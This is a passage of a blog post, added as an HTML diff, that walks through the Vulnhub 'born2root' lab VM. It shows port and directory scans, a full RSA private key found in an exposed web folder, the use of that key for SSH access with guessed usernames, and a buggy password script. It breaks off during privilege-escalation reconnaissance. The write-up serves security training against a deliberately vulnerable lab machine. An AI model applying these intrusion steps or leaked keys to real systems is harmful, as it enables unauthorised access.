@@ -1,0 +1,755 @@
+<!DOCTYPE html>
+<html class="no-js">
+<head>
+    <meta charset="utf-8">
+    <title>Vulnhub, born2root | maggick's logs</title>
+
+    <meta name="author" content="maggick">
+    <meta name="description" content="">
+    <meta name="robots" content="">
+        <meta name="keywords" content="">
+        <meta property="og:title" content="">
+        <meta property="og:description" content="">
+        <meta property="og:url" content="">
+        <meta property="og:image" content="">
+    <meta property="og:site_name" content="maggick's logs">
+    <meta property="og:type" content="website">
+
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+        <link rel="icon" type="image/x-icon" href="https://maggick.fr/media/favicon.ico">
+
+        <link href="feeds/all.atom.xml" rel="alternate" title="maggick's logs" type="application/atom+xml">
+
+    <link rel="canonical" href="">
+
+    <link rel="stylesheet" href="../../theme/css/pure-min.css">
+    <link rel="stylesheet" href="../../theme/css/main.css">
+</head>
+<body>
+<div id="page" class="full-entry">
+    <header class="pure-g-r header">
+        <div class="pure-u-1">
+            <div class="wrapper">
+                <div class="l-box">
+                    <a href="../../index.html" title="Home page"
+                            class="logo">maggick's
+<span class="secondary">logs</span>                    </a>
+                </div>
+            </div>
+
+<nav class="pure-menu pure-menu-open pure-menu-horizontal menu">
+    <ul>
+            <li>
+              |
+            </li>
+                <li>
+                    <a href="../../pages/about.html">About</a>
+                </li>
+                <li>
+                    <a href="../../pages/notes.html">Notes</a>
+                </li>
+    </ul>
+</nav>        </div>
+    </header>
+
+    <div class="pure-g-r wrapper">
+        <section class="content pure-u-17-24">
+            <div class="l-box">
+
+<article class="entry">
+
+    <header class="entry-header">
+        <h1 class="entry-title">
+      <a href="../../2017/11/vulnhub-born2root.html" title="Read more" class="entry-title-link">
+                Vulnhub, born2root</a>
+        </h1>
+
+        <div class="entry-date">
+            <time datetime="2017-11-20T16:00:00+01:00">20 Nov 2017</time>
+        </div>
+
+    <div class="entry-meta">
+      <span class="meta entry-author">
+        <span class="icons icons-author"></span>
+        <a href="../../author/maggick.html" title="Read more posts from maggick" class="meta-link">maggick</a>
+      </span>
+
+      <span class="meta entry-tags">
+        <span class="icons icons-category"></span>
+          <a href="../../tag/security.html" title="Read more with the label security" class="meta-link">security</a> 
+          <a href="../../tag/vulnhub.html" title="Read more with the label vulnhub" class="meta-link">vulnhub</a> 
+          <a href="../../tag/boot2root.html" title="Read more with the label boot2root" class="meta-link">boot2root</a> 
+          <a href="../../tag/linux.html" title="Read more with the label linux" class="meta-link">linux</a> 
+      </span>
+              <span class="meta entry-tags">
+              <p style="text-align:right; color:#aaaaaa; ">&nbsp Estimated read time: 8 minutes</p></span>
+    </div>
+    </header>
+
+    <div class="entry-content">
+            <p><img class="align-left"
+src="/media/2017.11/born2root/1.png" alt="Born2root homepage" width="162"></p>
+<p>After the bulldog machine I worked on the <a href="https://www.vulnhub.com/entry/born2root-1,197/">born2root</a> one.
+A simple boot2root machine by <a href="https://twitter.com/h4d3sw0rm">Hadi Mene</a>.</p>
+
+
+<h2 id="discovery">Discovery</h2>
+<p>First we scan all port of the VM:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>root@kalili:~# nmap -sSV 10.0.2.5</span>
+<span class="code-line"></span>
+<span class="code-line">Starting Nmap 7.60 ( https://nmap.org ) at 2017-11-14 15:43 CET</span>
+<span class="code-line">Nmap scan report for 10.0.2.5</span>
+<span class="code-line">Host is up (0.00036s latency).</span>
+<span class="code-line">Not shown: 997 closed ports</span>
+<span class="code-line">PORT    STATE SERVICE VERSION</span>
+<span class="code-line">22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)</span>
+<span class="code-line">80/tcp  open  http    Apache httpd 2.4.10 ((Debian))</span>
+<span class="code-line">111/tcp open  rpcbind 2-4 (RPC #100000)</span>
+<span class="code-line">MAC Address: 08:00:27:84:43:C4 (Oracle VirtualBox virtual NIC)</span>
+<span class="code-line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span>
+<span class="code-line"></span>
+<span class="code-line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span>
+<span class="code-line">Nmap done: 1 IP address (1 host up) scanned in 6.74 seconds</span>
+<span class="code-line"></code></pre></div>
+
+<p>So we got a SSH service on port 22 and a web service on the port 80.
+Let's see what the website propose:</p>
+<h2 id="web">Web</h2>
+<p>The website simulate a company selling security services:</p>
+<p><img alt="Landing page" src="/media/2017.11/born2root/1.png"></p>
+<p>The robots.txt file contain 2 url:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>User-agent: *</span>
+<span class="code-line">Disallow: /wordpress-blog</span>
+<span class="code-line">Disallow: /files</span>
+<span class="code-line"></code></pre></div>
+
+<p>The <code>/wordpress-blog</code> lead us to a simple image:</p>
+<p><img alt="Troll" src="/media/2017.11/born2root/2.png"></p>
+<p>The /files give us an empty directory listing:</p>
+<p><img alt="Directory listing" src="/media/2017.11/born2root/4.png"></p>
+<p>We launch <code>dirb</code> against the site:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="n">root</span><span class="nv">@kalili</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">dirb</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0.2.5</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"><span class="o">-----------------</span><span class="w"></span></span>
+<span class="code-line"><span class="n">DIRB</span><span class="w"> </span><span class="n">v2</span><span class="mf">.22</span><span class="w"></span></span>
+<span class="code-line"><span class="k">By</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">Dark</span><span class="w"> </span><span class="n">Raver</span><span class="w"></span></span>
+<span class="code-line"><span class="o">-----------------</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="nl">START_TIME</span><span class="p">:</span><span class="w"> </span><span class="n">Tue</span><span class="w"> </span><span class="n">Nov</span><span class="w"> </span><span class="mi">14</span><span class="w"> </span><span class="mi">15</span><span class="err">:</span><span class="mi">45</span><span class="err">:</span><span class="mi">36</span><span class="w"> </span><span class="mi">2017</span><span class="w"></span></span>
+<span class="code-line"><span class="nl">URL_BASE</span><span class="p">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0.2.5</span><span class="o">/</span><span class="w"></span></span>
+<span class="code-line"><span class="nl">WORDLIST_FILES</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">dirb</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">common</span><span class="p">.</span><span class="n">txt</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="o">-----------------</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">GENERATED</span><span class="w"> </span><span class="nl">WORDS</span><span class="p">:</span><span class="w"> </span><span class="mi">4612</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="o">----</span><span class="w"> </span><span class="n">Scanning</span><span class="w"> </span><span class="nl">URL</span><span class="p">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0.2.5</span><span class="o">/</span><span class="w"> </span><span class="o">----</span><span class="w"></span></span>
+<span class="code-line"><span class="o">==&gt;</span><span class="w"> </span><span class="nl">DIRECTORY</span><span class="p">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0.2.5</span><span class="o">/</span><span class="n">files</span><span class="o">/</span><span class="w"></span></span>
+<span class="code-line"><span class="o">==&gt;</span><span class="w"> </span><span class="nl">DIRECTORY</span><span class="p">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0.2.5</span><span class="o">/</span><span class="n">icons</span><span class="o">/</span><span class="w"></span></span>
+<span class="code-line"><span class="o">+</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0.2.5</span><span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="n">html</span><span class="w"> </span><span class="p">(</span><span class="nl">CODE</span><span class="p">:</span><span class="mi">200</span><span class="o">|</span><span class="k">SIZE</span><span class="err">:</span><span class="mi">5651</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"><span class="o">==&gt;</span><span class="w"> </span><span class="nl">DIRECTORY</span><span class="p">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0.2.5</span><span class="o">/</span><span class="n">manual</span><span class="o">/</span><span class="w"></span></span>
+<span class="code-line"><span class="o">+</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0.2.5</span><span class="o">/</span><span class="n">robots</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="p">(</span><span class="nl">CODE</span><span class="p">:</span><span class="mi">200</span><span class="o">|</span><span class="k">SIZE</span><span class="err">:</span><span class="mi">57</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"><span class="o">+</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0.2.5</span><span class="o">/</span><span class="n">server</span><span class="o">-</span><span class="n">status</span><span class="w"> </span><span class="p">(</span><span class="nl">CODE</span><span class="p">:</span><span class="mi">403</span><span class="o">|</span><span class="k">SIZE</span><span class="err">:</span><span class="mi">296</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="o">----</span><span class="w"> </span><span class="n">Entering</span><span class="w"> </span><span class="nl">directory</span><span class="p">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0.2.5</span><span class="o">/</span><span class="n">files</span><span class="o">/</span><span class="w"> </span><span class="o">----</span><span class="w"></span></span>
+<span class="code-line"><span class="p">(</span><span class="err">!</span><span class="p">)</span><span class="w"> </span><span class="nl">WARNING</span><span class="p">:</span><span class="w"> </span><span class="n">Directory</span><span class="w"> </span><span class="k">IS</span><span class="w"> </span><span class="n">LISTABLE</span><span class="p">.</span><span class="w"> </span><span class="k">No</span><span class="w"> </span><span class="n">need</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">it</span><span class="p">.</span><span class="w"> </span><span class="p">(</span><span class="k">Use</span><span class="w"> </span><span class="n">mode</span><span class="w"> </span><span class="s1">&#39;-w&#39;</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">want</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">anyway</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"><span class="o">----</span><span class="w"> </span><span class="n">Entering</span><span class="w"> </span><span class="nl">directory</span><span class="p">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0.2.5</span><span class="o">/</span><span class="n">icons</span><span class="o">/</span><span class="w"> </span><span class="o">----</span><span class="w"></span></span>
+<span class="code-line"><span class="p">(</span><span class="err">!</span><span class="p">)</span><span class="w"> </span><span class="nl">WARNING</span><span class="p">:</span><span class="w"> </span><span class="n">Directory</span><span class="w"> </span><span class="k">IS</span><span class="w"> </span><span class="n">LISTABLE</span><span class="p">.</span><span class="w"> </span><span class="k">No</span><span class="w"> </span><span class="n">need</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">it</span><span class="p">.</span><span class="w"> </span><span class="p">(</span><span class="k">Use</span><span class="w"> </span><span class="n">mode</span><span class="w"> </span><span class="s1">&#39;-w&#39;</span><span class="w"> </span><span class="k">if</span><span class="w"> </span><span class="n">you</span><span class="w"> </span><span class="n">want</span><span class="w"> </span><span class="k">to</span><span class="w"> </span><span class="n">scan</span><span class="w"> </span><span class="n">it</span><span class="w"> </span><span class="n">anyway</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"><span class="o">----</span><span class="w"> </span><span class="n">Entering</span><span class="w"> </span><span class="nl">directory</span><span class="p">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0.2.5</span><span class="o">/</span><span class="n">manual</span><span class="o">/</span><span class="w"> </span><span class="o">----</span><span class="w"></span></span>
+<span class="code-line"><span class="o">==&gt;</span><span class="w"> </span><span class="nl">DIRECTORY</span><span class="p">:</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.0.2.5</span><span class="o">/</span><span class="n">manual</span><span class="o">/</span><span class="n">da</span><span class="o">/</span><span class="w"></span></span>
+<span class="code-line"><span class="o">&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span><span class="w"></span></span>
+<span class="code-line"></code></pre></div>
+
+<p>It found an interesting directory: <code>icons</code> it contains a lot of icon and a file VDSoyuAXiO.txt:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="gh">-----BEGIN RSA PRIVATE KEY-----</span><span class="w"></span></span>
+<span class="code-line"><span class="s">MIIEowIBAAKCAQEAoNgGGOyEpn/txphuS2pDA1i2nvRxn6s8DO58QcSsY+/Nm6wC</span><span class="w"></span></span>
+<span class="code-line"><span class="s">tprVUPb+fmkKvOf5ntACY7c/5fM4y83+UWPG0l90WrjdaTCPaGAHjEpZYKt0lEc0</span><span class="w"></span></span>
+<span class="code-line"><span class="s">FiQkXTvJS4faYHNah/mEvhldgTc59jeX4di0f660mJjF31SA9UgMLQReKd5GKtUx</span><span class="w"></span></span>
+<span class="code-line"><span class="s">5m+sQq6L+VyA2/6GD/T3qx35AT4argdk1NZ9ONmj1ZcIp0evVJvUul34zuJZ5mDv</span><span class="w"></span></span>
+<span class="code-line"><span class="s">DZuLRR6QpcMLJRGEFZ4qwkMZn7NavEmfX1Yka6mu9iwxkY6iT45YA1C4p7NEi5yI</span><span class="w"></span></span>
+<span class="code-line"><span class="s">/P6kDxMfCVELAUaU8fcPolkZ6xLdS6yyThZHHwIDAQABAoIBAAZ+clCTTA/E3n7E</span><span class="w"></span></span>
+<span class="code-line"><span class="s">LL/SvH3oGQd16xh9O2FyR4YIQMWQKwb7/OgOfEpWjpPf/dT+sK9eypnoDiZkmYhw</span><span class="w"></span></span>
+<span class="code-line"><span class="s">+rGii6Z2wCXhjN7wXPnj1qotXkpu4bgS3+F8+BLjlQ79ny2Busf+pQNf1syexDJS</span><span class="w"></span></span>
+<span class="code-line"><span class="s">sEkoDLGTBiubD3Ii4UoF7KfsozihdmQY5qud2c4iE0ioayo2m9XIDreJEB20Q5Ta</span><span class="w"></span></span>
+<span class="code-line"><span class="s">lV0G03unv/v7OK3g8dAQHrBR9MXuYiorcwxLAe+Gm1h4XanMKDYM5/jW4JO2ITAn</span><span class="w"></span></span>
+<span class="code-line"><span class="s">kPducC9chbM4NqB3ryNCD4YEgx8zWGDt0wjgyfnsF4fiYEI6tqAwWoB0tdqJFXAy</span><span class="w"></span></span>
+<span class="code-line"><span class="s">FlQJfYECgYEAz1bFCpGBCApF1k/oaQAyy5tir5NQpttCc0L2U1kiJWNmJSHk/tTX</span><span class="w"></span></span>
+<span class="code-line"><span class="s">4+ly0CBUzDkkedY1tVYK7TuH7/tOjh8M1BLa+g+Csb/OWLuMKmpoqyaejmoKkLnB</span><span class="w"></span></span>
+<span class="code-line"><span class="s">WVGkcdIulfsW7DWVMS/zA8ixJpt7bvY7Y142gkurxqjLMz5s/xT9geECgYEAxpfC</span><span class="w"></span></span>
+<span class="code-line"><span class="s">fGvogWRYUY07OLE/b7oMVOdBQsmlnaKVybuKf3RjeCYhbiRSzKz05NM/1Cqf359l</span><span class="w"></span></span>
+<span class="code-line"><span class="s">Wdznq4fkIvr6khliuj8GuCwv6wKn9+nViS18s1bG6Z5UJYSRJRpviCS+9BGShG1s</span><span class="w"></span></span>
+<span class="code-line"><span class="s">KOf1fAWNwRcn1UKtdQVvaLBX9kIwcmTBrl+e6P8CgYAtz24Zt6xaqmpjv6QKDxEq</span><span class="w"></span></span>
+<span class="code-line"><span class="s">C1rykAnx0+AKt3DVWYxB1oRrD+IYq85HfPzxHzOdK8LzaHDVb/1aDR0r2MqyfAnJ</span><span class="w"></span></span>
+<span class="code-line"><span class="s">kaDwPx0RSN++mzGM7ZXSuuWtcaCD+YbOxUsgGuBQIvodlnkwNPfsjhsV/KR5D85v</span><span class="w"></span></span>
+<span class="code-line"><span class="s">VhGVGEML0Z+T4ucSNQEOAQKBgQCHedfvUR3Xx0CIwbP4xNHlwiHPecMHcNBObS+J</span><span class="w"></span></span>
+<span class="code-line"><span class="s">4ypkMF37BOghXx4tCoA16fbNIhbWUsKtPwm79oQnaNeu+ypiq8RFt78orzMu6JIH</span><span class="w"></span></span>
+<span class="code-line"><span class="s">dsRvA2/Gx3/X6Eur6BDV61to3OP6+zqh3TuWU6OUadt+nHIANqj93e7jy9uI7jtC</span><span class="w"></span></span>
+<span class="code-line"><span class="s">XXDmuQKBgHZAE6GTq47k4sbFbWqldS79yhjjLloj0VUhValZyAP6XV8JTiAg9CYR</span><span class="w"></span></span>
+<span class="code-line"><span class="s">2o1pyGm7j7wfhIZNBP/wwJSC2/NLV6rQeH7Zj8nFv69RcRX56LrQZjFAWWsa/C43</span><span class="w"></span></span>
+<span class="code-line"><span class="s">rlJ7dOFH7OFQbGp51ub88M1VOiXR6/fU8OMOkXfi1KkETj/xp6t+</span><span class="w"></span></span>
+<span class="code-line"><span class="gh">-----END RSA PRIVATE KEY-----</span><span class="w"></span></span>
+<span class="code-line"></code></pre></div>
+
+<p>This looks like an ssh private key. We extract the associated public key:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>openssl rsa -in .ssh/id_rsa -pubout -out key.pub</span>
+<span class="code-line"></code></pre></div>
+
+<p>And we convert it to  ssh format:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code>ssh-keygen -f key.pub -i -mPKCS8</span>
+<span class="code-line"></code></pre></div>
+
+<p>The we can copy the private key to <code>~/.ssh/id_rsa</code> and the public key to <code>~/.ssh/id_rsa.pub</code></p>
+<p>But we have no idea of the associated user. We try the one listed on the site main page:</p>
+<ul>
+<li>Martin N =&gt; martin, martinn, nmartin</li>
+<li>Hadi M =&gt; hadi, hadim, mhadi</li>
+<li>Jimmy S =&gt; jimmy, jymmys, sjimmy</li>
+</ul>
+<p>And we got a shell with the first one: martin. The server is asking us for a password, but we already got a shell. Entering anything will give use the focus and <code>CTRL-C</code> it will give us a simple error message.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="n">root</span><span class="err">@</span><span class="n">kalili</span><span class="p">:</span><span class="o">~</span><span class="c1"># ssh 10.0.2.5 -i .ssh/id_rsa -lmartin</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">The</span><span class="w"> </span><span class="n">programs</span><span class="w"> </span><span class="n">included</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">Debian</span><span class="w"> </span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span><span class="w"> </span><span class="n">system</span><span class="w"> </span><span class="n">are</span><span class="w"> </span><span class="n">free</span><span class="w"> </span><span class="n">software</span><span class="p">;</span><span class="w"></span></span>
+<span class="code-line"><span class="n">the</span><span class="w"> </span><span class="n">exact</span><span class="w"> </span><span class="n">distribution</span><span class="w"> </span><span class="n">terms</span><span class="w"> </span><span class="k">for</span><span class="w"> </span><span class="n">each</span><span class="w"> </span><span class="n">program</span><span class="w"> </span><span class="n">are</span><span class="w"> </span><span class="n">described</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="n">the</span><span class="w"></span></span>
+<span class="code-line"><span class="n">individual</span><span class="w"> </span><span class="n">files</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">doc</span><span class="o">/*/</span><span class="n">copyright</span><span class="o">.</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">Debian</span><span class="w"> </span><span class="n">GNU</span><span class="o">/</span><span class="n">Linux</span><span class="w"> </span><span class="n">comes</span><span class="w"> </span><span class="n">with</span><span class="w"> </span><span class="n">ABSOLUTELY</span><span class="w"> </span><span class="n">NO</span><span class="w"> </span><span class="n">WARRANTY</span><span class="p">,</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">the</span><span class="w"> </span><span class="n">extent</span><span class="w"></span></span>
+<span class="code-line"><span class="n">permitted</span><span class="w"> </span><span class="n">by</span><span class="w"> </span><span class="n">applicable</span><span class="w"> </span><span class="n">law</span><span class="o">.</span><span class="w"></span></span>
+<span class="code-line"><span class="n">Last</span><span class="w"> </span><span class="n">login</span><span class="p">:</span><span class="w"> </span><span class="n">Tue</span><span class="w"> </span><span class="n">Nov</span><span class="w"> </span><span class="mi">14</span><span class="w"> </span><span class="mi">15</span><span class="p">:</span><span class="mi">57</span><span class="p">:</span><span class="mi">00</span><span class="w"> </span><span class="mi">2017</span><span class="w"> </span><span class="n">from</span><span class="w"> </span><span class="mf">10.0</span><span class="o">.</span><span class="mf">2.15</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">READY</span><span class="w"> </span><span class="n">TO</span><span class="w"> </span><span class="n">ACCESS</span><span class="w"> </span><span class="n">THE</span><span class="w"> </span><span class="n">SECRET</span><span class="w"> </span><span class="n">LAB</span><span class="w"> </span><span class="err">?</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="n">secret</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="p">:</span><span class="w"> </span><span class="o">^</span><span class="n">CTraceback</span><span class="w"> </span><span class="p">(</span><span class="n">most</span><span class="w"> </span><span class="n">recent</span><span class="w"> </span><span class="n">call</span><span class="w"> </span><span class="n">last</span><span class="p">):</span><span class="w"></span></span>
+<span class="code-line"><span class="w">  </span><span class="n">File</span><span class="w"> </span><span class="s2">&quot;/var/tmp/login.py&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">line</span><span class="w"> </span><span class="mi">8</span><span class="p">,</span><span class="w"> </span><span class="ow">in</span><span class="w"> </span><span class="o">&lt;</span><span class="n">module</span><span class="o">&gt;</span><span class="w"></span></span>
+<span class="code-line"><span class="w">    </span><span class="n">password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">raw_input</span><span class="p">(</span><span class="s2">&quot;secret password : &quot;</span><span class="p">)</span><span class="w"></span></span>
+<span class="code-line"><span class="n">KeyboardInterrupt</span><span class="w"></span></span>
+<span class="code-line"></code></pre></div>
+
+<p>The program doesn't seems to work as intended:</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="n">martin</span><span class="nd">@debian</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">cat</span> <span class="o">/</span><span class="n">var</span><span class="o">/</span><span class="n">tmp</span><span class="o">/</span><span class="n">login</span><span class="o">.</span><span class="n">py</span></span>
+<span class="code-line"><span class="c1">#!/usr/bin/python</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="kn">import</span> <span class="nn">os</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">)</span></span>
+<span class="code-line"><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;READY TO ACCESS THE SECRET LAB ? &quot;</span><span class="p">)</span></span>
+<span class="code-line"><span class="nb">print</span><span class="p">(</span><span class="s2">&quot;&quot;</span><span class="p">)</span></span>
+<span class="code-line"><span class="n">password</span> <span class="o">=</span> <span class="n">raw_input</span><span class="p">(</span><span class="s2">&quot;secret password : &quot;</span><span class="p">)</span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="k">if</span> <span class="p">(</span><span class="n">password</span><span class="p">)</span> <span class="o">==</span> <span class="s2">&quot;secretsec&quot;</span> <span class="ow">or</span> <span class="s2">&quot;secretlab&quot;</span> <span class="p">:</span></span>
+<span class="code-line">  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;WELCOME ! &quot;</span><span class="p">)</span></span>
+<span class="code-line"><span class="k">else</span><span class="p">:</span></span>
+<span class="code-line">  <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;GET OUT ! &quot;</span><span class="p">)</span></span>
+<span class="code-line">  <span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s2">&quot;pkill -u &#39;martin&#39;&quot;</span><span class="p">)</span></span>
+<span class="code-line"></code></pre></div>
+
+<h2 id="privilege-elevation">Privilege elevation</h2>
+<p>As always a bit of reconnaissance is needed.</p>
+<div class="highlight"><pre><span class="code-line"><span></span><code><span class="n">martin</span><span class="nv">@debian</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">ls</span><span class="w"> </span><span class="o">-</span><span class="n">alRh</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="w"></span></span>
+<span class="code-line"><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="err">:</span><span class="w"></span></span>
+<span class="code-line"><span class="o">&lt;</span><span class="n">SNIP</span><span class="o">&gt;</span><span class="w"></span></span>
+<span class="code-line"></span>
+<span class="code-line"><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="nl">hadi</span><span class="p">:</span><span class="w"></span></span>
+<span class="code-line"><span class="n">total</span><span class="w"> </span><span class="mi">60</span><span class="n">K</span><span class="w"></span></span>
+<span class="code-line"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">3</span><span class="w"> </span><span class="n">hadi</span><span class="w"> </span><span class="n">hadi</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span><span class="mi">0</span><span class="n">K</span><span class="w"> </span><span class="n">juin</span><span class="w">   </span><span class="mi">5</span><span class="w"> </span><span class="mi">13</span><span class="err">:</span><span class="mi">40</span><span class="w"> </span><span class="p">.</span><span class="w"></span></span>
+<span class="code-line"><span class="n">drwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">5</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">4</span><span class="p">,</span><span class="mi">0</span><span class="n">K</span><span class="w"> </span><span class="n">juin</span><span class="w">   </span><span class="mi">9</span><span class="w"> </span><span class="mi">20</span><span class="err">:</span><span class="mi">17</span><span class="w"> </span><span class="p">..</span><span class="w"></span></span>
+<span class="code-line"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">hadi</span><span class="w"> </span><span class="n">hadi</span><span class="w">  </span><span class="mi">220</span><span class="w"> </span><span class="n">avril</span><span class="w"> </span><span class="mi">26</span><span class="w">  </span><span class="mi">2017</span><span class="w"> </span><span class="p">.</span><span class="n">bash_logout</span><span class="w"></span></span>
+<span class="code-line"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">hadi</span><span class="w"> </span><span class="n">hadi</span><span class="w"> </span><span class="mi">3</span><span class="p">,</span><span class="mi">5</span><span class="n">K</span><span class="w"> </span><span class="n">avril</span><span class="w"> </span><span class="mi">26</span><span class="w">  </span><span class="mi">2017</span><span class="w"> </span><span class="p">.</span><span class="n">bashrc</span><span class="w"></span></span>
+<span class="code-line"><span class="o">-</span><span class="n">rwxr</span><span class="o">-</span><span class="n">xr</span><span class="o">-</span><span class="n">x</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">5</span><span class="p">,</span><span class="mi">3</span><span class="n">K</span><span class="w"> </span><span class="n">mai</span><span class="w">   </span><span class="mi">10</span><span class="w">  </span><span class="mi">2017</span><span class="w"> </span><span class="n">buff</span><span class="w"></span></span>
+<span class="code-line"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="mi">1</span><span class="n">K</span><span class="w"> </span><span class="n">mai</span><span class="w">   </span><span class="mi">10</span><span class="w">  </span><span class="mi">2017</span><span class="w"> </span><span class="n">buff</span><span class="p">.</span><span class="n">c</span><span class="w"></span></span>
+<span class="code-line"><span class="o">-</span><span class="n">rw</span><span class="o">-</span><span class="n">r</span><span class="o">--</span><span class="n">r</span><span class="o">--</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="n">root</span><span class="w">  </span><span class="mi">148</span><span class="w"> </span><span class="n">juin</span><span class="w">   </span><span class="mi">5</span><span class="w"> </span><span class="mi">13</span><span class="err">:</span><span class="mi">25</span><span class="w"> </span><span class="n">example</span><span class="p">.</span><span class="n">c</span><span class="w"></span></span>
